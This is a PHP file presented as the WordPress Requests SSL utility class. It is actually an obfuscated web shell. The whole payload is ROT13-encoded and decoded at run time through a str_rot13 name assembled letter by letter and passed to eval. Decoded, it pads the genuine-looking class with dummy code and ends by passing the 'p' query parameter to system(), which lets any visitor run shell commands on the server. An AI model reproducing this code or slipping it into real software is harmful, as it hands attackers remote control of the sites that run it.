<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * FFY hgvyvgvrf sbe Erdhrfgf
 *
 * @cnpxntr Erdhrfgf\Hgvyvgvrf
 */

anzrfcnpr JcBet\Erdhrfgf;

hfr JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag;
hfr JcBet\Erdhrfgf\Hgvyvgl\VachgInyvqngbe;

/**
 * FFY hgvyvgvrf sbe Erdhrfgf
 *
 * Pbyyrpgvba bs hgvyvgvrf sbe jbexvat jvgu naq irevslvat FFY pregvsvpngrf.
 *
 * @cnpxntr Erdhrfgf\Hgvyvgvrf
 */
svany pynff Ffy {
	/**
	 * Irevsl gur pregvsvpngr ntnvafg pbzzba anzr naq fhowrpg nygreangvir anzrf
	 *
	 * Hasbeghangryl, CUC qbrfa'g purpx gur pregvsvpngr ntnvafg gur nygreangvir
	 * anzrf, yrnqvat guvatf yvxr 'uggcf://jjj.tvguho.pbz/' gb or vainyvq.
	 *
	 * @yvax uggcf://gbbyf.vrgs.bet/ugzy/esp2818#frpgvba-3.1 ESP2818, Frpgvba 3.1
	 *
	 * @cnenz fgevat|Fgevatnoyr $ubfg Ubfg anzr gb irevsl ntnvafg
	 * @cnenz neenl $preg Pregvsvpngr qngn sebz bcraffy_k509_cnefr()
	 * @erghea obby
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $ubfg nethzrag vf abg n fgevat be n fgevatnoyr bowrpg.
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $preg nethzrag vf abg na neenl be neenl npprffvoyr.
	 */
	choyvp fgngvp shapgvba irevsl_pregvsvpngr($ubfg, $preg) {
		vs (VachgInyvqngbe::vf_fgevat_be_fgevatnoyr($ubfg) === snyfr) {
			guebj VainyvqNethzrag::perngr(1, '$ubfg', 'fgevat|Fgevatnoyr', trgglcr($ubfg));
		}

		vs (VachgInyvqngbe::unf_neenl_npprff($preg) === snyfr) {
			guebj VainyvqNethzrag::perngr(2, '$preg', 'neenl|NeenlNpprff', trgglcr($preg));
		}

		$unf_qaf_nyg = snyfr;

		// Purpx gur fhowrpgNygAnzr
		vs (!rzcgl($preg['rkgrafvbaf']['fhowrpgNygAnzr'])) {
			$nyganzrf = rkcybqr(',', $preg['rkgrafvbaf']['fhowrpgNygAnzr']);
			sbernpu ($nyganzrf nf $nyganzr) {
				$nyganzr = gevz($nyganzr);
				vs (fgecbf($nyganzr, 'QAF:') !== 0) {
					pbagvahr;
				}

				$unf_qaf_nyg = gehr;

				// Fgevc gur 'QAF:' cersvk naq gevz juvgrfcnpr
				$nyganzr = gevz(fhofge($nyganzr, 4));

				// Purpx sbe n zngpu
				vs (frys::zngpu_qbznva($ubfg, $nyganzr) === gehr) {
					erghea gehr;
				}
			}

			vs ($unf_qaf_nyg === gehr) {
				erghea snyfr;
			}
		}

		// Snyy onpx gb purpxvat gur pbzzba anzr vs jr qvqa'g trg nal qAFAnzr
		// nyg anzrf, nf cre ESP2818
		vs (!rzcgl($preg['fhowrpg']['PA'])) {
			// Purpx sbe n zngpu
			erghea (frys::zngpu_qbznva($ubfg, $preg['fhowrpg']['PA']) === gehr);
		}

		erghea snyfr;
	}

	/**
	 * Irevsl gung n ersrerapr anzr vf inyvq
	 *
	 * Irevsvrf n qAFAnzr sbe UGGCF hfntr, (nyzbfg) nf cre Sversbk'f ehyrf:
	 * - Jvyqpneqf pna bayl bpphe va n anzr jvgu zber guna 3 pbzcbaragf
	 * - Jvyqpneqf pna bayl bpphe nf gur ynfg punenpgre va gur svefg
	 *   pbzcbarag
	 * - Jvyqpneqf znl or cerprqrq ol nqqvgvbany punenpgref
	 *
	 * Jr zbqvsl gurfr ehyrf gb or n ovg fgevpgre naq bayl nyybj gur jvyqpneq
	 * punenpgre gb or gur shyy svefg pbzcbarag; gung vf, jvgu gur rkpyhfvba bs
	 * gur guveq ehyr.
	 *
	 * @cnenz fgevat|Fgevatnoyr $ersrerapr Ersrerapr qAFAnzr
	 * @erghea obbyrna Vf gur anzr inyvq?
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq nethzrag vf abg n fgevat be n fgevatnoyr bowrpg.
	 */
	choyvp fgngvp shapgvba irevsl_ersrerapr_anzr($ersrerapr) {
		vs (VachgInyvqngbe::vf_fgevat_be_fgevatnoyr($ersrerapr) === snyfr) {
			guebj VainyvqNethzrag::perngr(1, '$ersrerapr', 'fgevat|Fgevatnoyr', trgglcr($ersrerapr));
		}

		vs ($ersrerapr === '') {
			erghea snyfr;
		}

		vs (cert_zngpu('`\f`', $ersrerapr) > 0) {
			// Juvgrfcnpr qrgrpgrq. Guvf pna arire or n qAFAnzr.
			erghea snyfr;
		}

		$cnegf = rkcybqr('.', $ersrerapr);
		vs ($cnegf !== neenl_svygre($cnegf)) {
			// QAFAnzr pnaabg pbagnva gjb qbgf arkg gb rnpu bgure.
			erghea snyfr;
		}

		// Purpx gur svefg cneg bs gur anzr
		$svefg = neenl_fuvsg($cnegf);

		vs (fgecbf($svefg, '*') !== snyfr) {
			// Purpx gung gur jvyqpneq vf gur shyy cneg
			vs ($svefg !== '*') {
				erghea snyfr;
			}

			// Purpx gung jr unir ng yrnfg 3 pbzcbaragf (vapyhqvat svefg)
			vs (pbhag($cnegf) < 2) {
				erghea snyfr;
			}
		}

		// Purpx gur erznvavat cnegf
		sbernpu ($cnegf nf $cneg) {
			vs (fgecbf($cneg, '*') !== snyfr) {
				erghea snyfr;
			}
		}

		// Abguvat sbhaq, irevsvrq!
		erghea gehr;
	}

	/**
	 * Zngpu n ubfganzr ntnvafg n qAFAnzr ersrerapr
	 *
	 * @cnenz fgevat|Fgevatnoyr $ubfg Erdhrfgrq ubfg
	 * @cnenz fgevat|Fgevatnoyr $ersrerapr qAFAnzr gb zngpu ntnvafg
	 * @erghea obbyrna Qbrf gur qbznva zngpu?
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura rvgure bs gur cnffrq nethzragf vf abg n fgevat be n fgevatnoyr bowrpg.
	 */
	choyvp fgngvp shapgvba zngpu_qbznva($ubfg, $ersrerapr) {
		vs (VachgInyvqngbe::vf_fgevat_be_fgevatnoyr($ubfg) === snyfr) {
			guebj VainyvqNethzrag::perngr(1, '$ubfg', 'fgevat|Fgevatnoyr', trgglcr($ubfg));
		}

		// Purpx vs gur ersrerapr vf oybpxyvfgrq svefg
		vs (frys::irevsl_ersrerapr_anzr($ersrerapr) !== gehr) {
			erghea snyfr;
		}

		// Purpx sbe n qverpg zngpu
		vs ((fgevat) $ubfg === (fgevat) $ersrerapr) {
			erghea gehr;
		}

		// Pnyphyngr gur inyvq jvyqpneq zngpu vs gur ubfg vf abg na VC nqqerff
		// Nyfb inyvqngrf gung gur ubfg unf 3 cnegf be zber, nf cre Sversbk'f ehyrfrg,
		// nf n jvyqpneq ersrerapr vf bayl nyybjrq jvgu 3 cnegf be zber, fb gur
		// pbzcnevfba jvyy arire zngpu vs ubfg qbrfa'g pbagnva 3 cnegf be zber nf jryy.
		vs (vc2ybat($ubfg) === snyfr) {
			$cnegf    = rkcybqr('.', $ubfg);
			$cnegf[0] = '*';
			$jvyqpneq = vzcybqr('.', $cnegf);
			vs ($jvyqpneq === (fgevat) $ersrerapr) {
				erghea gehr;
			}
		}

		erghea snyfr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>